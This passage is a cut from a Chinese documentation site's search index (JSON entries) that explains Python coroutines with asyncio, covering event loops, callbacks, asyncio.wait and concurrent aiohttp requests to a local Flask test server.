\u79d2 \u5e76\u53d1 \u6211\u4eec\u53ea\u6267\u884c\u4e86\u4e00\u4e2a\u534f\u7a0b\u4efb\u52a1\uff0c\u5982\u679c\u9700\u8981\u6267\u884c\u591a\u6b21\u5e76\u5c3d\u53ef\u80fd\u5730\u63d0\u9ad8\u6548\u7387\u8be5\u600e\u4e48\u529e\u5462\uff1f\u6211\u4eec\u53ef\u4ee5\u5b9a\u4e49\u4e00\u4e2atask\u5217\u8868\uff0c\u7136\u540e\u4f7f\u7528asyncio\u7684wait()\u65b9\u6cd5\u6267\u884c\u5373\u53ef await\u540e\u9762\u7684\u5bf9\u8c61\u5fc5\u987b\u662f\u5982\u4e0b\u7c7b\u578b\u4e4b\u4e00\u3002 \u4e00\u4e2a\u539f\u751fcoroutine\u5bf9\u8c61\u3002 \u4e00\u4e2a\u7531types.coroutine()\u4fee\u9970\u7684\u751f\u6210\u5668\uff0c\u8fd9\u4e2a\u751f\u6210\u5668\u53ef\u4ee5\u8fd4\u56decoroutine\u5bf9\u8c61\u3002 \u4e00\u4e2a\u5305\u542bawait\u65b9\u6cd5\u7684\u5bf9\u8c61\u8fd4\u56de\u7684\u4e00\u4e2a\u8fed\u4ee3\u5668\u3002 asyncio.sleep\uff082\uff09\u662f\u4e00\u4e2a\u7531coroutine\u4fee\u9970\u7684\u751f\u6210\u5668\u51fd\u6570\uff0c\u8868\u793a\u7b49\u5f852\u79d2\u3002\u63a5\u4e0b\u6765\u6211\u4eec\u5b9a\u4e49\u4e86\u4e00\u4e2a\u5217\u8868tasks\uff0c\u75315\u4e2atask()\u7ec4\u6210\uff0c\u6700\u540e\u4f7f\u7528loop.run_until_complete(asyncio.wait(tasks))\u63d0\u4ea4\u6267\u884c\uff0c\u53735\u4e2a\u4efb\u52a1\u5e76\u53d1\u6267\u884c\uff0c\u8017\u65f6\u63a5\u8fd1\u4e8e\u5355\u4e2a\u4efb\u52a1\u7684\u8017\u65f6\uff0c\u8fd9\u91cc\u5e76\u6ca1\u6709\u4f7f\u7528\u591a\u8fdb\u7a0b\u6216\u591a\u7ebf\u7a0b\uff0c\u4ece\u800c\u5b9e\u73b0\u4e86\u5e76\u53d1\u64cd\u4f5c\u3002task\u53ef\u4ee5\u66ff\u6362\u4e3a\u4efb\u610f\u8017\u65f6\u8f83\u9ad8\u7684I/O\u64cd\u4f5c\u51fd\u6570\u3002 import asyncio import time async def task(): print(f\"{time.strftime('%H:%M:%S')}task\u5f00\u59cb\") #\u6a21\u62df\u4efb\u52a1 await asyncio.sleep(2) print(f\"{time.strftime('%H:%M:%S')}task\u7ed3\u675f\") # \u83b7\u53d6 EventLoop: loop = asyncio.get_event_loop() # \u6267\u884c coroutine tasks = [task() for _ in range(5)] start = time.time() loop.run_until_complete(asyncio.wait(tasks)) loop.close() end = time.time() print(f\"\u7528\u65f6{end - start}\u79d2\") \u5b9e\u7528\u6837\u4f8b\uff1a \u6211\u4eec\u4ee5\u5e38\u7528\u7684\u7f51\u7edc\u8bf7\u6c42\u573a\u666f\u4e3a\u4f8b\uff0c\u7f51\u7edc\u8bf7\u6c42\u8f83\u591a\u7684\u5e94\u7528\u5c31\u662fI/O\u5bc6\u96c6\u578b\u4efb\u52a1\u3002\u9996\u5148\u9700\u8981\u5efa\u7acb\u4e00\u4e2a\u670d\u52a1\u5668\u6765\u54cd\u5e94Web\u8bf7\u6c42\uff0c\u4e3a\u65b9\u4fbf\u6f14\u793a\uff0c\u6211\u4eec\u4f7f\u7528\u8f7b\u91cf\u7ea7\u7684Web\u6846\u67b6Flask\u6765\u5efa\u7acb\u4e00\u4e2a\u670d\u52a1\u5668\u3002 from flask import Flask import time app = Flask(__name__) @app.route('/') def index(): time.sleep(3) return 'hello world' if __name__=='__main__': app.run(threaded=True) \u5728\u4e0a\u8ff0\u4ee3\u7801\u4e2d\uff0c\u6211\u4eec\u5b9a\u4e49\u4e86\u4e00\u4e2aFlask\u670d\u52a1\uff0c\u4e3b\u5165\u53e3\u662findex()\u65b9\u6cd5\uff0c\u65b9\u6cd5\u4e2d\u5148\u8c03\u7528\u4e86sleep()\u65b9\u6cd5\u4f11\u77203\u79d2\uff0c\u7136\u540e\u8fd4\u56de\u7ed3\u679c\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u6bcf\u6b21\u8bf7\u6c42\u8fd9\u4e2a\u63a5\u53e3\u81f3\u5c11\u8981\u8017\u65f63\u79d2\uff0c\u8fd9\u6837\u6211\u4eec\u5c31\u6a21\u62df\u4e86\u4e00\u4e2a\u6162\u901f\u7684\u670d\u52a1\u63a5\u53e3\u3002\u6ce8\u610f\uff0c\u670d\u52a1\u542f\u52a8\u65f6\uff0crun()\u65b9\u6cd5\u6dfb\u52a0\u4e86\u4e00\u4e2a\u53c2\u6570threaded\uff0c\u8868\u660eFlask\u542f\u52a8\u4e86\u591a\u7ebf\u7a0b\u6a21\u5f0f\uff0c\u5426\u5219\u9ed8\u8ba4\u662f\u53ea\u6709\u4e00\u4e2a\u7ebf\u7a0b\u7684\u3002\u5982\u679c\u4e0d\u5f00\u542f\u591a\u7ebf\u7a0b\u6a21\u5f0f\uff0c\u90a3\u4e48\u540c\u4e00\u65f6\u523b\u9047\u5230\u591a\u4e2a\u8bf7\u6c42\u65f6\uff0c\u53ea\u80fd\u987a\u6b21\u5904\u7406\uff0c\u8fd9\u6837\u5373\u4f7f\u6211\u4eec\u4f7f\u7528\u534f\u7a0b\u5f02\u6b65\u8bf7\u6c42\u4e86\u8fd9\u4e2a\u670d\u52a1\uff0c\u4e5f\u53ea\u80fd\u4e00\u4e2a\u4e2a\u6392\u961f\u7b49\u5f85\uff0c\u74f6\u9888\u5c31\u4f1a\u51fa\u73b0\u5728\u670d\u52a1\u7aef\u3002\u6240\u4ee5\uff0c\u591a\u7ebf\u7a0b\u6a21\u5f0f\u662f\u6709\u5fc5\u8981\u6253\u5f00\u7684\u3002 \u534f\u7a0b\u53bb\u8bf7\u6c42 \u8981\u5b9e\u73b0\u5f02\u6b65\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528await\u5c06\u8017\u65f6\u7b49\u5f85\u7684\u64cd\u4f5c\u6302\u8d77\u8ba9\u51fa\u63a7\u5236\u6743\u3002\u5f53\u534f\u7a0b\u6267\u884c\u65f6\u9047\u5230await\uff0c\u65f6\u95f4\u5faa\u73af\u5c31\u4f1a\u5c06\u672c\u534f\u7a0b\u6302\u8d77\uff0c\u8f6c\u800c\u53bb\u6267\u884c\u522b\u7684\u534f\u7a0b\uff0c\u76f4\u5230\u5176\u4ed6\u7684\u534f\u7a0b\u6302\u8d77\u6216\u6267\u884c\u5b8c\u6bd5\u3002 aiohttp\u662f\u4e00\u4e2a\u652f\u6301\u5f02\u6b65\u8bf7\u6c42\u7684\u5e93\uff0c\u5229\u7528\u5b83\u548canyncio\u914d\u5408\uff0c\u5373\u53ef\u5b9e\u73b0\u5f02\u6b65\u8bf7\u6c42\u64cd\u4f5c\u3002 import asyncio import aiohttp import time now = lambda: time.strftime(\"%H:%M:%S\") async def get(url): session = aiohttp.ClientSession() response = await session.get(url) result = await response.text() await session.close() return result async def request(): url = 'http://127.0.0.1:5000' print(f\"{now()} \u8bf7\u6c42 {url}\") result = await get(url) print(f\"{now()} \u5f97\u5230\u54cd\u5e94 {result}\") start = time.time() ####\u591a\u5e76\u53d1 tasks = [asyncio.ensure_future(request()) for _ in range(50)] loop = asyncio.get_event_loop() loop.run_until_complete(asyncio.wait(tasks)) ### end = time.time() print(f\"\u8017\u65f6 {end - start} \u79d2\") \u8fd0\u884c\u7ed3\u679c\u7b26\u5408\u5f02\u5e38\u8bf7\u6c42\uff0c\u8017\u65f6\u753115\u79d2\u53d8\u6210\u4e863\u79d2\uff0c\u5373\u539f\u6765\u76841/5\uff0c\u5b9e\u73b0\u4e86\u5e76\u53d1\u8bbf\u95ee\u3002\u4ee3\u7801\u4e2d\u6211\u4eec\u4f7f\u7528\u4e86await\uff0c\u540e\u9762\u8ddf\u4e86get()\u65b9\u6cd5\uff0c\u5728\u6267\u884c\u8fd95\u4e2a\u534f\u7a0b\u7684\u65f6\u5019\uff0c\u5982\u679c\u9047\u5230await\uff0c\u5c31\u4f1a\u5c06\u5f53\u524d\u534f\u7a0b\u6302\u8d77\uff0c\u8f6c\u800c\u53bb\u6267\u884c\u5176\u4ed6\u7684\u534f\u7a0b\uff0c\u76f4\u5230\u5176\u4ed6\u7684\u534f\u7a0b\u4e5f\u6302\u8d77\u6216\u6267\u884c\u5b8c\u6bd5\uff0c\u518d\u8fdb\u884c\u4e0b\u4e00\u4e2a\u534f\u7a0b\u7684\u6267\u884c\u3002\u5f02\u6b65\u64cd\u4f5c\u7684\u4fbf\u6377\u4e4b\u5904\u662f\uff0c\u5f53\u9047\u5230\u963b\u585e\u5f0f\u64cd\u4f5c\u65f6\uff0c\u4efb\u52a1\u88ab\u6302\u8d77\uff0c\u7a0b\u5e8f\u63a5\u7740\u53bb\u6267\u884c\u5176\u4ed6\u7684\u4efb\u52a1\uff0c\u800c\u4e0d\u662f\u50bb\u50bb\u5730\u7b49\u7740\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u5145\u5206\u5229\u7528CPU\u65f6\u95f4\uff0c\u800c\u4e0d\u5fc5\u628a\u65f6\u95f4\u6d6a\u8d39\u5728\u7b49\u5f85I/O\u4e0a\u3002\u5728\u53d1\u51fa\u7f51\u7edc\u8bf7\u6c42\u540e\u76843\u79d2\u5185\uff0cCPU\u90fd\u662f\u7a7a\u95f2\u7684\uff0c\u90a3\u4e48\u589e\u52a0\u534f\u7a0b\u4efb\u52a1\u7684\u6570\u91cf\uff0c\u6700\u7ec8\u7684\u8017\u65f6\u8fd8\u4f1a\u662f3\u79d2\u5417\uff1f\u7406\u8bba\u6765\u8bf4\u786e\u5b9e\u662f\u8fd9\u6837\u7684\uff0c\u4e0d\u8fc7\u6709\u4e00\u4e2a\u524d\u63d0\uff0c\u90a3\u5c31\u662f\u670d\u52a1\u5668\u5728\u540c\u4e00\u65f6\u523b\u63a5\u53d7\u65e0\u9650\u6b21\u8bf7\u6c42\u90fd\u80fd\u4fdd\u8bc1\u6b63\u5e38\u8fd4\u56de\u7ed3\u679c\uff0c\u4e5f\u5c31\u662f\u670d\u52a1\u5668\u65e0\u9650\u6297\u538b\uff0c\u53e6\u5916\u8fd8\u8981\u5ffd\u7565I/O\u4f20\u8f93\u65f6\u5ef6\u3002\u6211\u4eec\u53ef\u4ee5\u5c06\u4e0a\u8ff0\u7684\u4efb\u52a1\u6570\u6269\u592720\u500d\uff0c\u5982\u4e0b\uff1a tasks = [asyncio.ensure_future(request()) for _ in range(20)] \u6700\u7ec8\u7684\u8017\u65f6\u5982\u4e0b\uff1a \u8017\u65f6 3.0600500106811523 \u79d2 \u8fd0\u884c\u65f6\u95f4\u4e5f\u662f\u57283\u79d2\u5de6\u53f3\uff0c\u5f53\u7136\u591a\u51fa\u6765\u7684\u65f6\u95f4\u5c31\u662fI/O\u65f6\u5ef6\u4e86\u3002\u53ef\u89c1\uff0c\u4f7f\u7528\u4e86\u5f02\u6b65\u534f\u7a0b\u4e4b\u540e\uff0c\u51e0\u4e4e\u53ef\u4ee5\u5728\u76f8\u540c\u7684\u65f6\u95f4\u5185\u5b9e\u73b0\u6210\u767e\u4e0a\u5343\u500d\u6b21\u7684\u7f51\u7edc\u8bf7\u6c42\uff0c\u628a\u8fd9\u4e2a\u6280\u672f\u8fd0\u7528\u5728\u722c\u866b\u9879\u76ee\u4e2d\uff0c\u901f\u5ea6\u63d0\u5347\u53ef\u8c13\u662f\u975e\u5e38\u53ef\u89c2\u4e86\u3002","title":"\u534f\u7a0b"},{"location":"programming_language/python/%E5%8D%8F%E7%A8%8B/%E5%8D%8F%E7%A8%8B/#_1","text":"","title":"\u534f\u7a0b"},{"location":"programming_language/python/%E5%8D%8F%E7%A8%8B/%E5%8D%8F%E7%A8%8B/#_2","text":"\u534f\u7a0b\u662f\u8f7b\u91cf\u7ea7\u7ebf\u7a0b\uff0c\u62e5\u6709\u81ea\u5df1\u7684\u5bc4\u5b58\u5668\u4e0a\u4e0b\u6587\u548c\u6808\u3002\u534f\u7a0b\u8c03\u5ea6\u5207\u6362\u65f6\uff0c\u5c06\u5bc4\u5b58\u5668\u4e0a\u4e0b\u6587\u548c\u6808\u4fdd\u5b58\u5230\u5176\u4ed6\u5730\u65b9\uff0c\u5728\u5207\u56de\u6765\u65f6\uff0c\u6062\u590d\u5148\u524d\u4fdd\u5b58\u7684\u5bc4\u5b58\u5668\u4e0a\u4e0b\u6587\u548c\u6808\u3002\u56e0\u6b64\uff0c\u534f\u7a0b\u80fd\u4fdd\u7559\u4e0a\u4e00\u6b21\u8c03\u7528\u65f6\u7684\u72b6\u6001\uff0c\u5373\u6240\u6709\u5c40\u90e8\u72b6\u6001\u7684\u4e00\u4e2a\u7279\u5b9a\u7ec4\u5408\uff0c\u6bcf\u6b21\u8fc7\u7a0b\u91cd\u5165\u65f6\uff0c\u5c31\u76f8\u5f53\u4e8e\u8fdb\u5165\u4e0a\u4e00\u6b21\u8c03\u7528\u7684\u72b6\u6001\u3002","title":"\u4ec0\u4e48\u662f\u534f\u7a0b"},{"location":"programming_language/python/%E5%8D%8F%E7%A8%8B/%E5%8D%8F%E7%A8%8B/#_3","text":"\u534f\u7a0b\u7684\u5e94\u7528\u573a\u666f\uff1aI/O\u5bc6\u96c6\u578b\u4efb\u52a1\u3002\u8fd9\u4e00\u70b9\u4e0e\u591a\u7ebf\u7a0b\u6709\u4e9b\u7c7b\u4f3c\uff0c\u4f46\u534f\u7a0b\u8c03\u7528\u662f\u5728\u4e00\u4e2a\u7ebf\u7a0b\u5185\u8fdb\u884c\u7684\uff0c\u662f\u5355\u7ebf\u7a0b\uff0c\u5207\u6362\u7684\u5f00\u9500\u5c0f\uff0c\u56e0\u6b64\u6548\u7387\u4e0a\u7565\u9ad8\u4e8e\u591a\u7ebf\u7a0b\u3002\u5f53\u7a0b\u5e8f\u5728\u6267\u884cIO\u64cd\u4f5c\u65f6\uff0cCPU\u662f\u7a7a\u95f2\u7684\uff0c\u53ef\u4ee5\u5145\u5206\u5229\u7528CPU\u7684\u65f6\u95f4\u7247\u6765\u5904\u7406\u5176\u4ed6\u4efb\u52a1\u3002\u5728\u5355\u7ebf\u7a0b\u4e2d\uff0c\u4e00\u4e2a\u51fd\u6570\u8c03\u7528\uff0c\u4e00\u822c\u662f\u4ece\u51fd\u6570\u7684\u7b2c\u4e00\u884c\u4ee3\u7801\u5f00\u59cb\u6267\u884c\uff0c\u7ed3\u675f\u4e8ereturn\u8bed\u53e5\u3001\u5f02\u5e38\u6216\u51fd\u6570\u6267\u884c\uff08\u4e5f\u53ef\u4ee5\u8ba4\u4e3a\u662f\u9690\u5f0f\u5730\u8fd4\u56de\u4e86None\uff09\u3002\u6709\u4e86\u534f\u7a0b\uff0c\u6211\u4eec\u5728\u51fd\u6570\u7684\u6267\u884c\u8fc7\u7a0b\u4e2d\uff0c\u5982\u679c\u9047\u5230\u4e86\u8017\u65f6\u7684I/O\u64cd\u4f5c\uff0c\u51fd\u6570\u5c31\u53ef\u4ee5\u4e34\u65f6\u8ba9\u51fa\u63a7\u5236\u6743\uff0c\u8ba9CPU\u6267\u884c\u5176\u4ed6\u51fd\u6570\uff0c\u7b49I/O\u64cd\u4f5c\u6267\u884c\u5b8c\u6bd5\u540e\u518d\u6536\u56de\u63a7\u5236\u6743\u3002","title":"\u4ec0\u4e48\u65f6\u5019\u7528"},{"location":"programming_language/python/%E5%8D%8F%E7%A8%8B/%E5%8D%8F%E7%A8%8B/#_4","text":"\u9996\u5148\u5f15\u5165asyncio\uff0c\u8fd9\u6837\u624d\u53ef\u4ee5\u4f7f\u7528async\u548cawait\u5173\u952e\u5b57\uff08async\u5b9a\u4e49\u4e00\u4e2a\u534f\u7a0b\uff0cawait\u7528\u4e8e\u4e34\u65f6\u6302\u8d77\u4e00\u4e2a\u51fd\u6570\u6216\u65b9\u6cd5\u7684\u6267\u884c\uff09\uff0c\u63a5\u7740\u4f7f\u7528async\u5b9a\u4e49\u4e00\u534f\u7a0b\u65b9\u6cd5\uff0c\u7136\u540e\u76f4\u63a5\u8c03\u7528\u8be5\u65b9\u6cd5\uff0c\u4f46\u662f\u8be5\u65b9\u6cd5\u5e76\u6ca1\u6709\u6267\u884c\uff0c\u800c\u662f\u8fd4\u56de\u4e86\u4e00\u4e2acoroutine\u534f\u7a0b\u5bf9\u8c61\u3002\u4f7f\u7528get_event_loop()\u65b9\u6cd5\u521b\u5efa\u4e00\u4e2a\u4e8b\u4ef6\u5faa\u73afloop\uff0c\u5e76\u8c03\u7528loop\u5bf9\u8c61\u7684run_until_complete()\u65b9\u6cd5\u5c06\u534f\u7a0b\u6ce8\u518c\u5230\u4e8b\u4ef6\u5faa\u73afloop\u4e2d\uff0c\u7136\u540e\u542f\u52a8\uff0c\u6700\u540e\u624d\u770b\u5230task\u65b9\u6cd5\u6253\u5370\u4e86\u8f93\u51fa\u7ed3\u679c\u3002async\u5b9a\u4e49\u7684\u65b9\u6cd5\u65e0\u6cd5\u76f4\u63a5\u6267\u884c\uff0c\u5fc5\u987b\u5c06\u5176\u6ce8\u518c\u5230\u4e8b\u4ef6\u5faa\u73af\u4e2d\u624d\u53ef\u4ee5\u6267\u884c\u3002 import asyncio import time async def task(): print(f\"{time.strftime('%H:%M:%S')}task\u5f00\u59cb\") time.sleep(2) print(f\"{time.strftime('%H:%M:%S')}task\u7ed3\u675f\") coroutine = task() print(f\"{time.strftime('%H:%M:%S')} \u4ea7\u751f\u534f\u7a0b\u5bf9\u8c61 {coroutine},\u51fd\u6570\u672a\u88ab\u8c03\u7528\") loop = asyncio.get_event_loop() print(f\"{time.strftime('%H:%M:%S')} \u5f00\u59cb\u8c03\u7528\u534f\u7a0b\") start = time.time() loop.run_until_complete(coroutine) end = time.time() print(f\"{time.strftime('%H:%M:%S')} \u7ed3\u675f\u8c03\u7528\u534f\u7a0b\uff0c\u8017\u65f6{end - start} \u79d2\") \u8fd0\u884c\u7ed3\u679c\uff1a 21:14:47 \u4ea7\u751f\u534f\u7a0b\u5bf9\u8c61 <coroutine object task at 0x7f98000ddbc0>,\u51fd\u6570\u672a\u88ab\u8c03\u7528 21:14:47 \u5f00\u59cb\u8c03\u7528\u534f\u7a0b 21:14:47task\u5f00\u59cb 21:14:49task\u7ed3\u675f 21:14:49 \u7ed3\u675f\u8c03\u7528\u534f\u7a0b\uff0c\u8017\u65f62.0022308826446533 \u79d2 \u6211\u4eec\u8fd8\u53ef\u4ee5\u4e3a\u4efb\u52a1\u7ed1\u5b9a\u56de\u8c03\u51fd\u6570\u3002 \u5728\u8fd9\u91cc\u6211\u4eec\u5b9a\u4e49\u4e86\u4e00\u4e2a\u534f\u7a0b\u65b9\u6cd5\u548c\u4e00\u4e2a\u666e\u901a\u65b9\u6cd5\u4f5c\u4e3a\u56de\u8c03\u51fd\u6570\uff0c\u534f\u7a0b\u65b9\u6cd5\u6267\u884c\u540e\u8fd4\u56de\u4e00\u4e2a\u5b57\u7b26\u4e32'\u8fd0\u884c\u675f'\u3002\u5176\u4e2d\u56de\u8c03\u51fd\u6570\u63a5\u6536\u4e00\u4e2a\u53c2\u6570\uff0c\u662ftask\u5bf9\u8c61\uff0c\u7136\u540e\u8c03\u7528print()\u65b9\u6cd5\u6253\u5370\u4e86task\u5bf9\u8c61\u7684\u7ed3\u679c\u3002asyncio.ensure_future(coroutine)\u53ef\u4ee5\u8fd4\u56detask\u5bf9\u8c61\uff0cadd_done_callback()\u4e3atask\u5bf9\u8c61\u589e\u52a0\u4e00\u4e2a\u56de\u8c03\u4efb\u52a1\u3002\u8fd9\u6837\u6211\u4eec\u5c31\u5b9a\u4e49\u597d\u4e86\u4e00\u4e2acoroutine\u5bf9\u8c61\u548c\u4e00\u4e2a\u56de\u8c03\u65b9\u6cd5\uff0c\u6267\u884c\u7684\u7ed3\u679c\u662f\u5f53coroutine\u5bf9\u8c61\u6267\u884c\u5b8c\u6bd5\u4e4b\u540e\uff0c\u5c31\u53bb\u6267\u884c\u58f0\u660e\u7684callback()\u65b9\u6cd5\u3002 import asyncio import time async def _task(): print(f\"{time.strftime('%H:%M:%S')} task\u5f00\u59cb\") time.sleep(2) print(f\"{time.strftime('%H:%M:%S')} task\u7ed3\u675f\") return \"\u8fd0\u884c\u7ed3\u675f\" def callback(task): print(f\"{time.strftime('%H:%M:%S')} \u5f00\u59cb\u8c03\u7528\u534f\u7a0b\") print(f\"\u72b6\u6001\uff1a{task.result()}\") coroutine = _task() print(f\"{time.strftime('%H:%M:%S')} \u4ea7\u751f\u534f\u7a0b\u5bf9\u8c61 {coroutine},\u51fd\u6570\u672a\u88ab\u8c03\u7528\") task = asyncio.ensure_future(coroutine) task.add_done_callback(callback) loop = asyncio.get_event_loop() print(f\"{time.strftime('%H:%M:%S')} \u5f00\u59cb\u8c03\u7528\u534f\u7a0b\") start = time.time() loop.run_until_complete(task) end = time.time() print(f\"{time.strftime('%H:%M:%S')} \u7ed3\u675f\u8c03\u7528\u534f\u7a0b\uff0c\u8017\u65f6{end - start} \u79d2\") \u8fd0\u884c\u7ed3\u679c\uff1a 21:26:21 \u4ea7\u751f\u534f\u7a0b\u5bf9\u8c61 <coroutine object _task at 0x7fdb8479eac0>,\u51fd\u6570\u672a\u88ab\u8c03\u7528 21:26:21 \u5f00\u59cb\u8c03\u7528\u534f\u7a0b 21:26:21 task\u5f00\u59cb 21:26:23 task\u7ed3\u675f 21:26:23 \u5f00\u59cb\u8c03\u7528\u534f\u7a0b \u72b6\u6001\uff1a\u8fd0\u884c\u7ed3\u675f 21:26:23 \u7ed3\u675f\u8c03\u7528\u534f\u7a0b\uff0c\u8017\u65f62.0030200481414795 \u79d2","title":"\u5b9a\u4e49\u534f\u7a0b"},{"location":"programming_language/python/%E5%8D%8F%E7%A8%8B/%E5%8D%8F%E7%A8%8B/#_5","text":"\u6211\u4eec\u53ea\u6267\u884c\u4e86\u4e00\u4e2a\u534f\u7a0b\u4efb\u52a1\uff0c\u5982\u679c\u9700\u8981\u6267\u884c\u591a\u6b21\u5e76\u5c3d\u53ef\u80fd\u5730\u63d0\u9ad8\u6548\u7387\u8be5\u600e\u4e48\u529e\u5462\uff1f\u6211\u4eec\u53ef\u4ee5\u5b9a\u4e49\u4e00\u4e2atask\u5217\u8868\uff0c\u7136\u540e\u4f7f\u7528asyncio\u7684wait()\u65b9\u6cd5\u6267\u884c\u5373\u53ef await\u540e\u9762\u7684\u5bf9\u8c61\u5fc5\u987b\u662f\u5982\u4e0b\u7c7b\u578b\u4e4b\u4e00\u3002 \u4e00\u4e2a\u539f\u751fcoroutine\u5bf9\u8c61\u3002 \u4e00\u4e2a\u7531types.coroutine()\u4fee\u9970\u7684\u751f\u6210\u5668\uff0c\u8fd9\u4e2a\u751f\u6210\u5668\u53ef\u4ee5\u8fd4\u56decoroutine\u5bf9\u8c61\u3002 \u4e00\u4e2a\u5305\u542bawait\u65b9\u6cd5\u7684\u5bf9\u8c61\u8fd4\u56de\u7684\u4e00\u4e2a\u8fed\u4ee3\u5668\u3002 asyncio.sleep\uff082\uff09\u662f\u4e00\u4e2a\u7531coroutine\u4fee\u9970\u7684\u751f\u6210\u5668\u51fd\u6570\uff0c\u8868\u793a\u7b49\u5f852\u79d2\u3002\u63a5\u4e0b\u6765\u6211\u4eec\u5b9a\u4e49\u4e86\u4e00\u4e2a\u5217\u8868tasks\uff0c\u75315\u4e2atask()\u7ec4\u6210\uff0c\u6700\u540e\u4f7f\u7528loop.run_until_complete(asyncio.wait(tasks))\u63d0\u4ea4\u6267\u884c\uff0c\u53735\u4e2a\u4efb\u52a1\u5e76\u53d1\u6267\u884c\uff0c\u8017\u65f6\u63a5\u8fd1\u4e8e\u5355\u4e2a\u4efb\u52a1\u7684\u8017\u65f6\uff0c\u8fd9\u91cc\u5e76\u6ca1\u6709\u4f7f\u7528\u591a\u8fdb\u7a0b\u6216\u591a\u7ebf\u7a0b\uff0c\u4ece\u800c\u5b9e\u73b0\u4e86\u5e76\u53d1\u64cd\u4f5c\u3002task\u53ef\u4ee5\u66ff\u6362\u4e3a\u4efb\u610f\u8017\u65f6\u8f83\u9ad8\u7684I/O\u64cd\u4f5c\u51fd\u6570\u3002 import asyncio import time async def task(): print(f\"{time.strftime('%H:%M:%S')}task\u5f00\u59cb\") #\u6a21\u62df\u4efb\u52a1 await asyncio.sleep(2) print(f\"{time.strftime('%H:%M:%S')}task\u7ed3\u675f\") # \u83b7\u53d6 EventLoop: loop = asyncio.get_event_loop() # \u6267\u884c coroutine tasks = [task() for _ in range(5)] start = time.time() loop.run_until_complete(asyncio.wait(tasks)) loop.close() end = time.time() print(f\"\u7528\u65f6{end - start}\u79d2\")","title":"\u5e76\u53d1"},{"location":"programming_language/python/%E5%8D%8F%E7%A8%8B/%E5%8D%8F%E7%A8%8B/#_6","text":"\u6211\u4eec\u4ee5\u5e38\u7528\u7684\u7f51\u7edc\u8bf7\u6c42\u573a\u666f\u4e3a\u4f8b\uff0c\u7f51\u7edc\u8bf7\u6c42\u8f83\u591a\u7684\u5e94\u7528\u5c31\u662fI/O\u5bc6\u96c6\u578b\u4efb\u52a1\u3002\u9996\u5148\u9700\u8981\u5efa\u7acb\u4e00\u4e2a\u670d\u52a1\u5668\u6765\u54cd\u5e94Web\u8bf7\u6c42\uff0c\u4e3a\u65b9\u4fbf\u6f14\u793a\uff0c\u6211\u4eec\u4f7f\u7528\u8f7b\u91cf\u7ea7\u7684Web\u6846\u67b6Flask\u6765\u5efa\u7acb\u4e00\u4e2a\u670d\u52a1\u5668\u3002 from flask import Flask import time app = Flask(__name__) @app.route('/') def index(): time.sleep(3) return 'hello world' if __name__=='__main__': app.run(threaded=True) \u5728\u4e0a\u8ff0\u4ee3\u7801\u4e2d\uff0c\u6211\u4eec\u5b9a\u4e49\u4e86\u4e00\u4e2aFlask\u670d\u52a1\uff0c\u4e3b\u5165\u53e3\u662findex()\u65b9\u6cd5\uff0c\u65b9\u6cd5\u4e2d\u5148\u8c03\u7528\u4e86sleep()\u65b9\u6cd5\u4f11\u77203\u79d2\uff0c\u7136\u540e\u8fd4\u56de\u7ed3\u679c\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u6bcf\u6b21\u8bf7\u6c42\u8fd9\u4e2a\u63a5\u53e3\u81f3\u5c11\u8981\u8017\u65f63\u79d2\uff0c\u8fd9\u6837\u6211\u4eec\u5c31\u6a21\u62df\u4e86\u4e00\u4e2a\u6162\u901f\u7684\u670d\u52a1\u63a5\u53e3\u3002\u6ce8\u610f\uff0c\u670d\u52a1\u542f\u52a8\u65f6\uff0crun()\u65b9\u6cd5\u6dfb\u52a0\u4e86\u4e00\u4e2a\u53c2\u6570threaded\uff0c\u8868\u660eFlask\u542f\u52a8\u4e86\u591a\u7ebf\u7a0b\u6a21\u5f0f\uff0c\u5426\u5219\u9ed8\u8ba4\u662f\u53ea\u6709\u4e00\u4e2a\u7ebf\u7a0b\u7684\u3002\u5982\u679c\u4e0d\u5f00\u542f\u591a\u7ebf\u7a0b\u6a21\u5f0f\uff0c\u90a3\u4e48\u540c\u4e00\u65f6\u523b\u9047\u5230\u591a\u4e2a\u8bf7\u6c42\u65f6\uff0c\u53ea\u80fd\u987a\u6b21\u5904\u7406\uff0c\u8fd9\u6837\u5373\u4f7f\u6211\u4eec\u4f7f\u7528\u534f\u7a0b\u5f02\u6b65\u8bf7\u6c42\u4e86\u8fd9\u4e2a\u670d\u52a1\uff0c\u4e5f\u53ea\u80fd\u4e00\u4e2a\u4e2a\u6392\u961f\u7b49\u5f85\uff0c\u74f6\u9888\u5c31\u4f1a\u51fa\u73b0\u5728\u670d\u52a1\u7aef\u3002\u6240\u4ee5\uff0c\u591a\u7ebf\u7a0b\u6a21\u5f0f\u662f\u6709\u5fc5\u8981\u6253\u5f00\u7684\u3002 \u534f\u7a0b\u53bb\u8bf7\u6c42 \u8981\u5b9e\u73b0\u5f02\u6b65\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528await\u5c06\u8017\u65f6\u7b49\u5f85\u7684\u64cd\u4f5c\u6302\u8d77\u8ba9\u51fa\u63a7\u5236\u6743\u3002\u5f53\u534f\u7a0b\u6267\u884c\u65f6\u9047\u5230await\uff0c\u65f6\u95f4\u5faa\u73af\u5c31\u4f1a\u5c06\u672c\u534f\u7a0b\u6302\u8d77\uff0c\u8f6c\u800c\u53bb\u6267\u884c\u522b\u7684\u534f\u7a0b\uff0c\u76f4\u5230\u5176\u4ed6\u7684\u534f\u7a0b\u6302\u8d77\u6216\u6267\u884c\u5b8c\u6bd5\u3002 aiohttp\u662f\u4e00\u4e2a\u652f\u6301\u5f02\u6b65\u8bf7\u6c42\u7684\u5e93\uff0c\u5229\u7528\u5b83\u548canyncio\u914d\u5408\uff0c\u5373\u53ef\u5b9e\u73b0\u5f02\u6b65\u8bf7\u6c42\u64cd\u4f5c\u3002 import asyncio import aiohttp import time now = lambda: time.strftime(\"%H:%M:%S\") async def get(url): session = aiohttp.ClientSession() response = await session.get(url) result = await response.text() await session.close() return result async def request(): url = 'http://127.0.0.1:5000' print(f\"{now()} \u8bf7\u6c42 {url}\") result = await get(url) print(f\"{now()} \u5f97\u5230\u54cd\u5e94 {result}\") start = time.time() ####\u591a\u5e76\u53d1 tasks = [asyncio.ensure_future(request()) for _ in range(50)] loop = asyncio.get_event_loop() loop.run_until_complete(asyncio.wait(tasks)) ### end = time.time() print(f\"\u8017\u65f6 {end - start} \u79d2\") 